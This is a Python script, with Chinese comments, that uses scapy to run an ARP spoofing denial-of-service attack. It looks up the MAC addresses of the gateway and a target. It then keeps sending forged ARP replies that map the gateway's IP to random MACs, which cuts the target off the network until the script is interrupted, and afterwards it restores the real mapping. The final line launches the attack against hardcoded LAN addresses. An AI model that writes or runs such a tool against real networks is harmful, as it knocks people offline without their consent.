from scapy.all import *
import time

'''
ARP协议各字段意义：
     hwsrc     :发送方源MAC/响应方源MAC
     psrc      :发送方源IP/响应方源IP
     hwdst     :发送方目的MAC/响应方目的MAC（ARP请求时填广播地址00:00:00:00:00:00，响应时填写发送方MAC）
     pdst      :发送方目的IP/响应方目的IP

'''


def get_random_mac():
    # generate a random MAC address
    mac = []
    for i in range(0, 6):
        mac.append(hex(random.randint(0, 256))[-2:])
    return ':'.join(mac)


def arpkill(target, gateway):
    # sr()加上p在二层发送
    # 先向网关和受害者发送ARP请求，获取初始硬件地址，用于之后的恢复
    response, unanswered = srp(
        Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=[gateway, target]), verbose=False)
    gatewaymac = response[0][1][ARP].hwsrc
    targetmac = response[1][1][ARP].hwsrc

    # 开始欺骗
    print('[*] Disconnecting {} from Gateway'.format(target))
    while True:
        try:
            send(ARP(hwsrc=get_random_mac(), psrc=gateway,
                     hwdst=targetmac, pdst=target, op=2), verbose=False)
            time.sleep(1)
        except KeyboardInterrupt:
            # 开始恢复网络到欺骗前的状态
            print('[*] Reconnecting {} to Gateway'.format(target))
            send(ARP(hwsrc=gatewaymac, psrc=gateway,
                     hwdst=targetmac, pdst=target, op=2), verbose=False)
            print('Completed')
            break


arpkill('192.168.176.130', '192.168.176.2')
